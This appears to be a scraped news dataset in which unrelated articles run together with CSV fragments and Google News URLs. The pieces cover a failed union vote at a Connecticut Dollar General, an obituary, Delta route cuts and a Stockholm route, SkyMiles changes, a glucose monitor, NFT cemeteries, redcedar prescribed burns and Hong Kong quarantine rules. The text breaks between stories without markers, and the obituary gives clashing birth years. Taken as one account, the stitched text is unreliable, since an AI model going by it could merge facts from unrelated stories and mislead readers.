Petronella intended to give Jen’s statement to the National Labor Relations Board which oversees union elections to ensure they are fair. She also saw the letter as a positive sign that Jen still supported the union.

On election day the NLRB set up a small white tent in the parking lot of the Dollar General. Parsons who agreed to serve as an observer for the union arrived at 8:30 a.m. and cast her ballot. A worker representing the company occupied a second table. For the next two hours Parsons sat watched and nervously waited as her co-workers cycled through.

Dollar General was challenging Serafini’s ballot but he was still allowed to vote. “It’s a great day for democracy” he told Parsons as he entered the tent.

“Absolutely!” Parsons replied.

A second co-worker who backed the union grinned at Parsons as he dropped his ballot in the cardboard box. A good sign. There were two workers both part-timers who hadn’t supported the union. Parsons assumed they both voted no.

She was most worried about Jen who stood over her ballot for several seconds shaking her head as if she was thinking Parsons said. Parsons tried to catch her eye but Jen hurried past her.

At 11:05 a.m. an NLRB representative counted the votes. To prevail Dollar General needed at least three of the six workers to vote against the union. The first two votes were both no. Then there was a yes followed by a brief pause as the NLRB representative unfolded the next ballot. Parsons breathed in through her light blue surgical mask.

“No” the NLRB official read.

At first Parsons didn’t believe it. She walked out of the tent and into the sunlight lit a cigarette and inhaled deeply. One of her co-workers called Serafini to let him know the outcome.

“I hate to be the one to tell you” he began.

“You’re kidding” Serafini replied. He had assumed that the union would win and that he would be back to work in a week or two. Now he felt alone.

Parsons and Petronella drove to a nearby McDonald’s to figure out what had happened and talk about their next steps. Tears streamed down Parsons’s face. She believed that the election hadn’t been fair that Dollar General had “polluted” her colleagues’ minds with falsehoods and fear.

“Obviously Jen voted no” Petronella said.

Over the course of her life Parsons had grown accustomed to feeling abandoned — by her parents the foster-care system the police and the courts. Now she wanted the union to stand with her appeal the vote to the NLRB and keep fighting.

“What do we do now?” she asked Petronella.

For Petronella and the union the answer was to move on to other battles. She could have sought an order that would have forced Dollar General to bargain with the union. “You have to hire lawyers and it ends up costing a lot” Petronella said. For a company like Dollar General the expense was nothing. But the union’s resources were limited.

Petronella decided that it would be faster and cheaper to wait 12 months and petition for another union vote if Parsons and her co-workers were still interested. Her last piece of unfinished business from the Dollar General organizing effort was Serafini who with the help of the union and a Labor Department lawyer was negotiating a wrongful-dismissal settlement with Dollar General.

Petronella wanted Dollar General to have to acknowledge publicly its agreement with Serafini just as it had done in Missouri.

Serafini’s immediate goal was to pay some bills and move on with his life perhaps becoming a social worker. His dismissal he said had revealed what Dollar General really thought of its workers. “You have people go above and beyond for a minimum-wage job and then get tossed because a union might mean it costs a little more to run the store. It’s all about greed” he said. “It just feels gross.”

For Parsons there was only one option after the union organizing effort failed: A few weeks after the election her alarm clock woke her at 5:15 a.m. giving her just enough time to stop by the methadone clinic for her daily dose before heading off to work.

The Dollar General executives had returned home and the store had settled back into its old rhythms. Parsons helped unload a “humongous truck” that arrived that morning and fell off a ladder while trying to retrieve a box of adult diapers from a storage shelf for an elderly customer. In the afternoon she headed off to a second job cleaning houses. She lugged bags of supplies and a scuffed yellow vacuum up the driveway of a small brick ranch house her back still throbbing from her fall. After only a few minutes of work her forehead glistened with sweat.

Parsons was more than $5000 behind on her electricity bill but was determined to use the money from her housekeeping jobs to pay the lawyer who was helping her fight for custody of her daughter. She saw Bella three times a week — visits that began with tense handoffs that Parsons knew took the heaviest toll on Bella.

After police charged Parsons’s ex with “threatening” behavior and “breach of peace” the courts granted Parsons a restraining order and mandated that she and her former partner exchange Bella in a well-lit public spot. For now it was the Big Y supermarket. Inside the store the two parents stood about 10 yards apart recording each other with their phones as their 8-year-old daughter ran with her head down from her father to her mother.

“Today Mommy doesn’t have too much money” Parsons said as she hurriedly outlined some options for their three-hour visit. Bella chose a $5.75 matinee of the new Marvel movie and Parsons began firing questions at her.

“Have you taken a shower lately?”

“What’s Daddy feeding you?”

“You’re still coughing baby. Are you taking your medicine?”

Three-quarters of the way through the movie Bella started to worry that they were going to be late for the court-mandated 8 p.m. drop-off with her dad. So they left early giving Parsons just enough time for a quick cigarette break before they sped through the Wendy’s drive-through. Her feet were sore. Her back still ached. Her gas gauge hovered just above empty. Parsons lit a cigarette in the parking lot. A few kernels of movie theater popcorn tossed by a giggling Bella struck her on the cheek.

Back at the Big Y they repeated the recorded drop-off in reverse. This was the worst part of Parsons’s day the time she felt most alone. “I fight addiction. I fight for my job. I fight for my kid. I fight for my survival” she said. “Every single way I turn I have to fight.”

One thing she could no longer afford to fight was Dollar General and so these days she was focused relentlessly on the company’s positives. Dollar General had dismissed the district manager who accused her boss of stealing — falsely employees said — and replaced him with a new person who seemed fair. The new district manager had recently promised to start reimbursing store employees for their mileage when they had to drive to the bank to drop off the day’s deposits. It wasn’t yet clear whether they would be reimbursed thousands of dollars for earlier unpaid trips.

“After the election I started to find out the truth about Dollar General” Parsons said. “It is not what we thought. If they knew what was going on they would have fixed it earlier. Really it was just a couple of bad people. Everyone has their flaws but Dollar General is great people.”

Parsons didn’t regret calling the union. Without the organizing effort she believed the problems at her store would never have been addressed. “It helped 100 percent” she said. But she also wasn’t upset that the unionizing push had failed. “If we won honestly I don’t know anymore” she continued. “I don’t know if it’d be different. Everything is just confusing.”

Two weeks before Thanksgiving Parsons received another bit of good news: Someone had posted on Parsons’s employee group text chat that the store would be closed on the holiday a change from previous years when it had been open for extended hours. “The union isn’t involved and they are still doing it” she said.

But it turned out that the company wasn’t actually doing it. The store was open from 7 a.m. to 10 p.m. on Thanksgiving Day just as it had been the previous year and Parsons was scheduled to work.

She didn’t let it bother her. She needed the money. She worked an 11-hour shift and then rushed to the Big Y where Bella was waiting.

Morgan Laurence Ernest ""Larry"" 1936 2021 Larry Morgan 83 of Prior Lake Minnesota passed away peacefully on Monday November 29 2021. Born November 4 1938 in Queens New York he was the son of the late Laurence Morgan Sr. and Helen Morgan. Larry is deeply missed and survived by his loving wife Maxine Morgan of 40 years; his three lovely daughters Jolene (RJ) Burgess of Medina MN Jodi (Steve) Davis of Fort Myers FL Joni (Eric) Brown of Castle Rock CO and five grandchildren: Jaimie Joshua Jacob Allie and Bingham the mother of his children Marge Morgan of Eagan MN. In 1955 Larry enlisted in the United States Air Force. He spent many years serving our country stationed is several parts of the world spending many years in places such as Germany Turkey and Hawaii. During his time with the United States Air Force his job was driving heavy equipment for the refueling of the Air Forces assets.

The parade started near Gardonville meandered through Deer Run and then ended in front of St. Ann's Church.

Santa who was on the last float of the evening stopped in front of the church posing for pictures and handing out goodie bags to all the children.

After the event Grace Lutheran Church members put on a Living Nativity in the parking lot of Gardonville.

The latest cuts come from Delta which is pulling seven routes and dropping 3 cities from its network.

The pull-down is largely focused on regional connectivity. Delta Connection partner SkyWest Airlines historically operated six of the seven routes getting axed.

You'll find the full list of route cuts below as first seen in Cirium schedules and later confirmed by a carrier spokesperson.

Origin Destination Notes Detroit (DTW) La Crosse Wisconsin (LSE) Minneapolis–Saint Paul (MSP) Great Falls Montana (GTF) Minneapolis–Saint Paul (MSP) Lincoln Nebraska (LNK) Market exit Minneapolis–Saint Paul (MSP) Marquette County Michigan (MQT) Salt Lake City (SLC) Cody Wyoming (COD) Market exit Salt Lake City (SLC) Grand Junction Colorado (GJT) Market exit Salt Lake City (SLC) Indianapolis Indiana (IND)

The headline is that three small U.S. cities are losing Delta service entirely. Flights to Grand Junction (GJT) and Lincoln (LNK) will end on Jan. 9 2022 while seasonal service to Cody (COD) has been suspended since October 2021.

A carrier spokesperson shared the following statement confirming the move.

Due to ongoing travel demand impact from the pandemic we have made the difficult decision to suspend Delta Connection service to these markets. We are working to reaccommodate customers with alternate plans or offer refunds as quickly as possible. We are grateful to all who supported this service throughout the years.

The unused regional aircraft will be redeployed for service to cities with greater demand.

Of the three markets getting cut perhaps the most interesting backstory is the one associated with Cody Wyoming.

This small city qualifies as an Essential Air Service (EAS) market meaning that the federal government provides subsidies to a chosen airline to guarantee service to this city.

United Express holds the EAS contract in Cody through May 31 2022. Delta's service wasn't subsidized by the government and it likely wasn't operating profitably.

Notably Delta will continue to serve the four other airports that are losing routes with flights from other hubs. SkyWest will continue serving Great Falls (GTF) via SLC La Crosse (LSE) via MSP and Marquette (MQT) via DTW. (Delta serves Indianapolis from multiple U.S. hubs.)

Delta's cuts are the latest to hit small U.S. cities.

Last month United filed plans to pull out of 11 markets nearly all of which were operated by regional partners. The Chicago-based airline cited a lack of demand and staffing shortages as the reasons for the route-map shake-up.

While Delta pares back its domestic network the airline is bullish on the return of transatlantic travel next summer.

This week the airline also filed plans to return to the New York-JFK to Stockholm (ARN) market with daily seasonal service starting on June 1. The carrier last operated the route five years ago according to Cirium schedules.

Adding Stockholm to its 2022 route map translates to an over 100% capacity increase on European routes relative to summer 2021. In total Delta plans to operate up to 70 daily flights from 21 destinations in Europe to 10 U.S. airports next summer.",https://news.google.com/articles/CBMiN2h0dHBzOi8vb25lbWlsZWF0YXRpbWUuY29tL25ld3MvZGVsdGEtc3RvY2tob2xtLWZsaWdodC_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Delta Launching New York To Stockholm Flight,"I tend to think that Stockholm is a pretty underrated destination at least in summer. For the past several years we’ve seen fairly little transatlantic service to Stockholm from full service airlines. The summer of 2022 will be a different story.

Delta Air Lines’ new route to Stockholm

Delta will be launching a new daily seasonal flight between New York (JFK) and Stockholm (ARN) in 2022. The service will be operate between June 1 and October 28 2022 with the following schedule:

DL204 New York to Stockholm departing 7:30PM arriving 9:30AM (+1 day)

DL205 Stockholm to New York departing 11:30AM arriving 2:10PM

The 3920-mile flight is blocked at 8hr eastbound and 8hr40min westbound. The flight will be operated by a Boeing 767-300 featuring 216 seats. This includes 26 business class seats 18 premium economy seats and and 172 economy class seats (21 of which feature extra legroom).

Delta’s Boeing 767 business class

This represents a service resumption from Delta though that dates back to long pre-pandemic. Delta last operated regularly scheduled flights to Stockholm in 2017 using a Boeing 757. So this will be the first time in five years that the route will be operated and it’ll also be a higher capacity flight than in the past.

Stockholm is awesome especially in summer

Stockholm’s 2022 transatlantic service

Delta won’t be the only airline flying nonstop between the United States and Sweden in 2022. United will also operate a daily seasonal flight between Newark and Stockholm though that flight will be operated by a smaller Boeing 757-200.

United will fly a Boeing 757 to Stockholm

Scandinavian Airlines will also operate flights from Stockholm to both Chicago and Newark this summer. While the airline used to have more transatlantic flights out of Stockholm most of the carrier’s long haul service has been consolidated in Copenhagen.

I’d say the much more interesting transatlantic capacity from Stockholm is that Finnair has set up a base there. The airline is currently flying from Stockholm to Los Angeles Miami and New York. These routes were initially only supposed to operate in winter but the Los Angeles and New York routes have been extended through summer. This reflects Finnair’s lack of long haul flying prospects out of Helsinki given that Asia continues to remain largely closed.

Finnair is flying Airbus A350s from Stockholm to the US

In the past Norwegian operated some transatlantic flights out of Stockholm though the airline discontinued long haul flights. Norse Atlantic Airways will be starting low cost transatlantic flights in the summer of 2022 though the airline will initially focus on Oslo as its transatlantic gateway.

So it seems like we should expect quite a bit of transatlantic capacity to Stockholm this summer with the choice of four full service airlines.

Bottom line

Delta will be bringing back its seasonal flight between New York and Stockholm in 2022 after a five year hiatus. The flight will be operated daily for about five months using a Boeing 767 so that’s a good bit of capacity.

It’s nice to see Stockholm get some love this summer with flights on Star Alliance oneworld and SkyTeam. Nothing beats the long days in Northern Europe that time of year.

What do you make of Delta bringing back its Stockholm flight?",https://news.google.com/articles/CBMiRGh0dHBzOi8vd3d3LmdvZHNhdmV0aGVwb2ludHMuY29tL2RlbHRhLXJlbW92ZXMtc2t5bWlsZXMtYmFzaWMtb2ZmZXIv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Why Can't Delta Just Offer A Pathetic Amount Of Miles On Basic Tickets?,"If you missed the news Delta is done giving you miles and elite status credit for flying on its cheapest tickets. Basic tickets will be excluded from SkyMiles earning.

Even if you don’t fly Delta it could be bad news for you since loyalty programs in the USA have perfected the game of “copy cat” and American and United are the market leaders in saying “whatever Delta does we’ll eventually do too”.

These airlines want people to look right on the screen to see that standard fares offer better value but sometimes the gulf between basic and standard airfares can be truly astronomical and virtually impossible to justify.

After a year of customer friendly moves such as the removal of most change fees why is Delta abandoning rewards for its most price sensitive but potentially loyal customers entirely; and why couldn’t they just offer a pathetic amount of miles as a gesture?

Delta’s Bizarre “No SkyMiles” Move

Delta will no longer award SkyMiles the points currency used by Delta or Medallion Miles (MQM’s) the system used to establish elite status for all basic economy tickets.

Fortunately these tickets are easy to spot in the Delta booking flow and therefore easy to avoid — if you’re willing to pay up.

Airlines including Spirit Frontier and JetBlue have aggressively rolled out ultra-cheap basic economy fares and Delta has been forced to compete with these prices on many markets but this move indicates it clearly doesn’t want to.

Like other legacy airlines Delta arguably does not want to sell these tickets and would much rather people pay up for a higher fare but he world doesn’t quite work like that so they do anyway.

It could be concluded that this significant new move to no longer award miles or status credit on these “basic” fares is a new “lever” to attempt to get Delta’s SkyMiles loyalty members to avoid these fares — and give them more money for each journey.

Delta has rightfully prided itself on earning a revenue premium versus other airlines — the assumption that people will pay more for “better” — thanks to a better on-board service reliable on time performance and other factors.

Delta’s move to create social distancing during the pandemic somewhat proved this concept. But — this may be a step too far. It also sends a message that loyalty is only loyalty when someone isn’t entirely happy.

The problem is by doing this Delta is creating an inferior proposition on basic tickets than low cost airlines which have actually worked to improve points and perks as well as on board experience.

Why Can’t Delta Offer A Pathetic Amount Of SkyMiles?

Since Delta awards miles based on how much you spend instead of how far you fly the cheapest tickets already earn paltry amounts of miles which would take quite a lot of flying to ever reap any benefit.

People inherently earn more when they spend more so punishing those who spend less seems redundant.

The gesture of offering miles on basic tickets is a classy wholistic approach to loyalty where a customer is always valued for choosing Delta versus other airlines rather than only valued when they “overpay” for a ticket.

If that’s gone what is loyalty?

If someone books a $100 round trip a general member would earn about 500 miles. Given Delta’s costs to book most flights with miles a whole lot of flying would need to take place before those miles ever came good.

So rather than just slapping loyal members in the face with no miles why not just offer a pathetic amount of miles as a token of the wholistic approach to loyalty? There are many ways Delta could do this in less offensive ways than they now have.

Here are a few alternative ways Delta could’ve made “basic economy” less attractive while still sending a better message than no miles or elite status credit at all.

Set a table for miles on basic tickets: 250 SkyMiles per one way (domestic) and 500 one way (international) no matter how much you spend. All other Delta tickets earn on spend so there’s much more to earn with other fares in most cases.

250 SkyMiles per one way (domestic) and 500 one way (international) no matter how much you spend. All other Delta tickets earn on spend so there’s much more to earn with other fares in most cases. Remove elite bonuses for basic tickets: if Delta wants elite SkyMiles members to pay up for higher fares why not just take away elite bonus miles on basic fares. Members still earn but those who care about hitting status or earning points will spend more.

if Delta wants elite SkyMiles members to pay up for higher fares why not just take away elite bonus miles on basic fares. Members still earn but those who care about hitting status or earning points will spend more. Create a lower earning rate for basic tickets: If earning tables are out and removing bonuses for elite members is too why not just say basic fares earn 3X miles per dollar unlike 5x for all the other tickets. Again it’s better than nothing.

In Europe Delta’s partners Air France and KLM has also been forced to compete with low cost airlines in an even more robust low-cost market. To help tackle that they just tweaked their formula for flights on low-cost airline partners that earn their miles so that they’re less rewarding than any fares offered by KLM or Air France.

Profits Now Loss Of Wallet Share Later?

Loyalty programs exist because airline wants points and accumulation of elite credit to be a driver to fly the airline versus others ideally even if it’s a bit more expensive.

That checks.

Delta doesn’t want its program to be as rewarding when you buy basic fares as what it will be when you purchase higher fares.

That checks too.

But since their program already accomplished that by rewarding miles and status based on spending what’s really being accomplished here? Just adjusting even more marginaal profit to a P&L for the quarter?

That may check for now but if Delta fliers particularly elite fliers begin to become brand atheists when flying on cheap leisure tickets and Delta loses wallet share to competitors there will be more losses than profits over time due to these changes."

The company behind the KnowU and UBand monitors is targeting a cost usage estimate of less than US$1000 per year.

4 Reviews

The KnowU and UBand Bio-RFID non-invasive blood glucose monitors are currently under further testing by the company that designed them Know Labs (Visulant Incorporated). While the two devices are still in a pre-FDA study stage (live “scientific research validation”) recent comparison tests published by the company have shined a very promising light on the KnowU and UBand. Both monitors utilize radio-frequency identification (RFID) to collect the required data for blood sugar level management.

Charts produced by Know Labs (see below) compare its Bio-RFID technology with the Accu-Check Fingerstick FreeStyle Libre 14-day and Dexcom G6 which all rely on minimally invasive/invasive methods to produce blood glucose level readings. While Bio-RFID did cross the margins for accuracy standards briefly against the Accu-Check Fingerstick the overall readings show that the KnowU and UBand are clearly getting closer to being ready for the required clinical trials they need to pass before they can go on the market.

As well as offering a pain-free alternative to finger sticking with lancets the company has estimated a <US$1000 per year cost for using a Bio-RFID technology product which is considerably less expensive than many other solutions that diabetes sufferers have to rely on. The KnowU monitor which can easily be carried around in a pocket and the UBand wearable offer users either on-demand or continuous measurement solutions respectively. Radio waves from the Bio-RFID devices penetrate the user’s tissue and “capture molecular signatures” meaning the blood glucose monitors can be used by anyone diabetic or not who wants to observe their blood sugar levels.

There has been mention of the KnowU and UBand potentially progressing onto the FDA approval stage at some point in 2022 which means painful finger-sticking could be consigned to history’s bin within a couple of years as the FDA approval process for medical devices is much quicker than it is for drugs especially for non-invasive products. An accompanying app will be made available for Android and Apple smartphones that will assist users with checking their KnowU or UBand readings whether it’s just on-demand or continuous blood glucose level management that is required.

As the world continues to run out of burial space a new option for memorializing loved ones presents itself: NFT designers are developing metaverse cemeteries.

On Thursday Dec. 8th — the same day the New York Times wrote about a metaverse wedding — a group called Remember launched its first public sale of 5000 commemorative “memorial stone” NFTs starting with a batch of 1500. According to Remember’s OpenSea shop page each NFT is unique “unlike traditional tombstones that share many similarities in size and color.” The description continues: “Each Memorial Stone doubles as a key to a user’s private Memorial Hall where they may store and display memories of their loved one as text images videos sounds 3D objects and more.”

In a Google Meet call from Seoul South Korea Remember admin Jae Lee says more than 500 stones have been sold so far; at press time some were selling for as much as $800 even though the stones are still “covered” — meaning the buyers don’t know what their purchases look like yet. He says big post-sale reveals of traits are now trending in the NFT world adding that the Remember reveal is coming soon (though he won’t yet say when).

Also the virtual land for Remember’s cemetery has yet to be purchased. A road map on the website claims that the Remember team is planning to use the proceeds generated from the sale of stones to buy digital real estate in various metaverse platforms including The Sandbox and Decentraland — with “many more to be confirmed.” The goal is to get everything up and running by 2022’s fourth quarter according to both the roadmap and Lee who says Remember is currently in talks with multiple venture capitalists to bring in more funds and hopefully speed up the metaverse development process.

Disconcertingly there’s no white paper on the Remember website let alone a list of terms and conditions — both of which are important tools for NFT collectors looking to avoid scams. What’s to stop an entrepreneurial mind from taking advantage of someone’s grief? Lee claims that buyers should feel secure in trusting them. “On Discord we have a project outline and announcements” says Lee who believes that white papers are more important for cryptocurrencies than NFTs. “NFTs are more about community. We have a driving community of 30000 people. They trust us. We speak to our community members regularly. We update them right away. A white paper is a boost of confidence but it’s not the basis of that confidence.” As for the lack of terms and conditions he says it’s “all about trust.” “You trust that Doge Coin will go up” he continues wide-eyed. “You trust that these NFT makers aren’t going to rug-pull you. You trust that this community is not going to spread fear. Terms and conditions that protect us and protect the consumer are not as important as the trust that is built by the community.” He does admit that they’ll adjust with growth though.

Editor’s picks

Lee who was coding for an e-commerce company in San Francisco before investment opportunities took him to Seoul says that he and his six core team members were deeply inspired by a fictional location known as the Halliday Journals building from the 2018 movie Ready Player One — wherein the tech businessman character James Halliday who built the simulation the movie centers around fills halls with his own memories like they’re pieces in an art gallery. This got him thinking: “When a celebrity dies people from all over the world commemorate them but they’re not actually able to visit the grave” Lee says. “In the metaverse anyone everywhere can always visit this person grieve and celebrate their lives together.”

Remember started with a simpler project over the summer essentially selling blockchain blocks for people to upload written tributes. After selling nearly 500 NFTs of something so basic they realized there was enough demand to create something 3D and immersive.

While the Remember folks are not the only ones looking towards this burgeoning space they are perhaps taking the most serious approach. Other public-facing projects appear more tongue in cheek. Gamer Graveyard which doesn’t seem to be monetized yet is “the final resting place for all the poor souls who quit gaming for ‘more important stuff’” according to its website which instructs visitors to “bury your friend here to let them know they’re missed online.”

The Solaghosts team is also building what they call a “metacemetery.” Like Remember the concept is rooted in the selling of virtual plots. However Solaghosts which is also planning to be fully operational by the end of next year takes a somewhat gamified approach allowing users to buy and bury NFT ghosts. Something similar can already be found within Decentraland — where a group called Dead Heads launched an interactive cemetery this past summer. Rolling Stone talked to one player of the NFT game Axie Infinity who says they want to make a cemetery for axies — which are the creatures users battle in the game — once purchasable land becomes available as promised by the developers: “As a community member I’ve seen many axies get banned or stolen” the person who goes by ohihello on Twitter says. “As someone who has experienced it myself I felt it could be an interesting idea to have a cemetery for all the lost axies regardless of how they got to the point of no longer being playable… It sounds hella crazy but there’s endless possibilities”

Ohihello isn’t the only one spitballing on Twitter. “Minted tombstones virtual funerals and cemeteries in the metaverse – count me in” tweeted one user who then suggested the idea of scanning freshly dead bodies to create 3d models of the deceased. Another called out for “cemeteries in the metaverse with an AI version of that person to interact with.” These ideas sound absurd until you find out that hologram company HereWeHolo offers life-size digital models of people who have passed: On their website there’s a section devoted to the idea of recording messages in advance of death so that people can speak at their own funerals. (Kanye West actually commissioned a HereWeHolo hologram of the late Robert Kardashian as a birthday gift for Kim Kardashian last year.)

Meanwhile a company called Genies is currently developing the tech for an avatar builder that anyone can use; so far Genies has only created avatars for public figures like Shawn Mendes via private partnerships. The app-store description calls the result “a fantasy version of yourself that you can use across the Internet.” So is it only a matter of time before our metahumans are speaking at our virtual funerals in metacemeteries? Somehow that seems likely.

Funerals inside video games are not new. Just last year The Sims 4 introduced a modification allowing users to put together in-game funerals. Also in 2020 Final Fantasy gamers organized a memorial march which was apparently attended by hundreds for a player who had died of Covid-19. “I love this community so much” one attendee tweeted when it was over. Well before that in 2006 gamers gathered in World of Warcraft to honor a comrade who had died of a stroke in real life.

But Final Fantasy and World of Warcraft are active combat-heavy games and in the latter event — which was being recorded for the deceased’s family — the service was ultimately raided by others who had seen the public listing and decided to take the opportunity to get some virtual kills in instead. It kind of makes sense that future-tech lovers would want proper virtual ceremonies inside battle-free worlds with customizable tombstones they can revisit over and over.

After all the word “meta” literally translates to “dead” in Hebrew so maybe this was the plan all along. If someone would just put me in touch with the overlord in charge of this simulation we’re all clearly living in I’d ask.",,,,,,,,,,,,

But these days as eastern redcedars invade the Great Plains grasslands trees are a dime a dozen.

The main culprit for this woody takeover? Fire suppression. Historically these grasslands burned every year allowing soil to recharge and spurring new perennial plants to grow. Frequent fires also kept redcedars relegated to rocky wet places incinerating any seedlings sprouting amid the grass. But when European settlers began dousing flames trees started encroaching.

The unintended encroachment of trees onto prairies has serious economic and ecologic consequences. The fast-growing species replace native perennial grasses cause more catastrophic wildfires displace wildlife and disrupt water and soil cycles.

Until recently this transition from grasslands to woodlands — a common problem worldwide — was thought to be irreversible. But ranchers in Nebraska’s Loess Canyons are proving it’s possible to restore healthy grasslands by fighting trees with fire. A 15-year study published this summer shows that reinstating fire in the Loess Canyons has turned the tide on invading redcedar one of the first examples that people can halt the transition of grasslands to woodlands at large scales.

“The Loess Canyons is one of the coolest large-scale experiments on fire restoration in the world” says Dirac Twidwell a rangeland ecologist at the University of Nebraska-Lincoln who co-authored the study. “Landowners have figured out how to safely burn their rangelands so they can sustain livestock and wildlife.”

The “Green Glacier” Degrading Grasslands

Along with the Serengeti in Africa America’s Great Plains — including the Sand Hills ecoregion in Nebraska — hold some of the most intact grasslands left in the world. But from Texas to South Dakota eastern redcedars are threatening these last best prairies. Remote sensing technology shows that from just 1999 to 2018 tree cover increased across 44 million acres of the Great Plains. That’s roughly the size of Kansas.

Ranchers like Scott Stout call it “the green glacier.” “Our prairie pastures were turning into forests where nothing could grow except more redcedar” says Stout who lives in the Loess Canyons and is president of the Nebraska Prescribed Fire Council.

Denser trees harm more than just ranchers’ bottom line. Encroaching junipers like the redcedar spell bad news for wildlife species that depend on wide-open prairies such as the northern bobwhite bird and black-footed ferret. Lesser prairie-chickens for instance are 40 times less likely to use grasslands with just five trees per hectare compared to a landscape without any trees. Even grassland-dwelling insects prefer open canopies: The abundance of American burying beetles a federally threatened species now found in only four states including Nebraska is negatively associated with tree cover.

The proliferation of eastern redcedar even impacts urban areas by reducing the amount of water available in streams and aquifers. Model simulations show that complete conversion of rangelands to redcedar woodland would deplete the Platte River a water source for one million Nebraska residents and reduce streamflow by 20 to 40 percent throughout the south-central Great Plains.

Cooperative Burn Groups Make Headway

To save their disappearing prairie Stout and his neighbors formed two prescribed burn associations in the Loess Canyons. More than 100 landowners south of the Platte River have shared their equipment and expertise in an effort to burn 135000 acres since 2004 amounting to one-third of this biologically-unique landscape.

According to Twidwell the Loess Canyons is an experimental landscape that holds promising clues on how to shift juniper woodlands back to biodiverse grasslands. “It's not just about having some fire on the ground it's about restoring fire as a broadly functioning part of the ecosystem” he says. “It matters how and where fire occurs its intensity and frequency — all of that really drives the ecosystem just as much as rain does.”

One key to successfully restoring the Loess Canyons is the strategic use of high-intensity prescribed fires in a few locations. Before burning the landowner first cuts isolated trees along the perimeter and piles the dead limbs beneath dense canopies of eastern redcedar located in the center of the planned burn area. This allows volunteers to safely contain the low-intensity grass fire along the burn’s perimeter and helps the forested interior burn hotter to incinerate seed sources.

Long-term vegetation monitoring in the Loess Canyons shows these high-intensity fires create a biodiverse grassland just one year after a burn. Burns reduced tree cover from less than 50 percent back down to historic levels of less than 10 percent — and increased the abundance and diversity of perennial plants. Plus results appear to last: Surveyed burned areas were still dominated by perennial grasses 15 years later.

“We didn’t really notice the quality of range had degraded until we saw what we gained back” Stout says. “The grasses are much more abundant following a fire. It amazes me it took us so long to figure that out.”

Adding Fuel to Fire Research

Research from the Loess Canyons also shows that wildlife is responding positively to the more frequent fires. Alison Ludwig a graduate student at the University of Nebraska-Lincoln documented increases in the abundance of American burying beetles after prescribed fires restored the insect’s preferred herbaceous habitat.

Plus a forthcoming study in Ecological Solutions and Evidence will provide the first evidence that burning benefits populations of grassland birds at an ecoregion scale. Grassland bird richness increased across 65 percent (222000 acres) of the Loess Canyons after 14 years of fire treatment.

Twidwell says research from this experimental landscape is co-produced with landowners and resource managers: “We’re trying to strike a balance between science that is scientifically rigorous while also practical for rangeland producers and the people working on the ground to protect our remaining grasslands.”

To scale up the lessons learned from the Loess Canyons researchers are partnering with Working Lands for Wildlife a conservation effort led by the U.S. Department of Agriculture’s Natural Resources Conservation Service. The goal is to provide technical and financial support to more landowners across the Great Plains who are interested in using fire to prevent woody encroachment.

“Let's face it fires are going to continue to occur” Twidwell says. “The more we can figure out how to shape this natural event the more we will be able to manage grasslands in a way that prevents out-of-control wildfires and benefits local ranchers wildlife water and the ecosystem as a whole.”",https://news.google.com/articles/CBMidGh0dHBzOi8vd3d3LnNjbXAuY29tL3lwL2Rpc2NvdmVyL3lvdXItdm9pY2UvYXJ0aWNsZS8zMTU5MTYwL2ZhY2Utc2hvdWxkLWhvbmcta29uZy1zaG9ydGVuLXJlcXVpcmVkLXF1YXJhbnRpbmUtcGVyaW9k0gF0aHR0cHM6Ly9hbXAuc2NtcC5jb20veXAvZGlzY292ZXIveW91ci12b2ljZS9hcnRpY2xlLzMxNTkxNjAvZmFjZS1zaG91bGQtaG9uZy1rb25nLXNob3J0ZW4tcmVxdWlyZWQtcXVhcmFudGluZS1wZXJpb2Q?hl=en-US&gl=US&ceid=US%3Aen,Face Off: Should Hong Kong shorten the required quarantine period length?,"If you are interested in joining future Face Off debates fill out this form to submit your application.

The Covid-19 pandemic has prompted governments around the world to implement mandatory quarantine for travellers to prevent the spread of the virus.

However the quarantine policy varies among different countries. Hong Kong has adopted a stringent quarantine period of 21 days in designated hotels for visitors from most countries.

Hong Kong’s quarantine requirements are one of the toughest in the world.

The World Health Organization recommends a 14-day quarantine because nearly all cases develop symptoms within that period.

What we know about the Omicron variant so far

Professor Ben Cowling an infectious disease expert at the University of Hong Kong said that a 21-day quarantine is unnecessarily long. It shouldn’t be more than 14 days he added.

A long quarantine also damages one’s mental health.

A new academic paper lays out the challenges to mental health and details how some people experience post-traumatic stress disorder depression and insomnia long after the quarantine ends.

Also the quarantine exemption granted to certain groups of people does not make sense. In fact some coronavirus outbreaks in Hong Kong appeared to have originated from exempted groups such as aircrew rather than people who were quarantined.

Hong Kong is known as “Asia’s world city” yet it is now one of the region’s most isolated cities.

Rival business hubs such as Singapore and Tokyo have started to open up adopting new policies to coexist with Covid-19 and scrapping quarantine for vaccinated travellers.

As an international financial hub Hong Kong must open its borders for its economy to thrive. Quarantine is needed to prevent community outbreaks of Covid-19 but it should be based on science.

If the Hong Kong government insists to maintaining its “zero-Covid” strategy it should at least consider shortening the quarantine period.

The World Health Organization wants to start prepping for the next pandemic

Against: Thaddeus Yiu 12 CCC Heep Woh College

Before the pandemic Hongkongers were among the most well-travelled people on Earth while millions of tourists visited the city every year. I would love to see Hong Kong opening up to the outside world once again but for that to happen we need to shorten the quarantine period. I don’t see that happening soon because it would be too risky especially with the recent emergence of the highly infectious Omicron variant.

If we open our borders now silent carriers could be everywhere in the community!

We have heard about people testing positive for Covid-19 even after their three-week isolation period.

The teens who created a game to help people survive quarantine

Some of the visitors who test positive for the coronavirus show no symptoms. If Hong Kong had a shorter quarantine period they could spread the disease among their friends and relatives. And within a few days hundreds could be infected.

There is no doubt that a shorter quarantine would encourage tourists to come to Hong Kong but it might cause a community outbreak.

We don’t want restrictions like those imposed by many Western nations do we?

One might argue that it is difficult for people to comply with the tough quarantine rules.

We can’t expect everyone to take precautions when they travel. Photo: EPA-EFE

A good example is the three Cathay Pacific cargo pilots who were infected with Covid-19 after they breached internal guidelines during their overseas stay.

We all want freedom but we should learn to sacrifice a bit during a pandemic.

I think it is important for all of us to get vaccinated. Without proper protection it may not be possible to stop the pandemic.

Omicron variant likely not more severe than Delta Fauci says

The 21-day quarantine will dishearten travellers but will do local people more good than harm.

Hong Kong is also negotiating open borders with the mainland while trying to increase the flagging Covid-19 inoculation rate among the city’s elderly.

It would be better to continue to assess the risks and a “basket of important factors” before changing the quarantine requirements.",,,,,,,,,

The worker revolt comes to a Dollar General in Connecticut A call to a union triggers one of the most lopsided battles of the ongoing low-wage-worker revolt

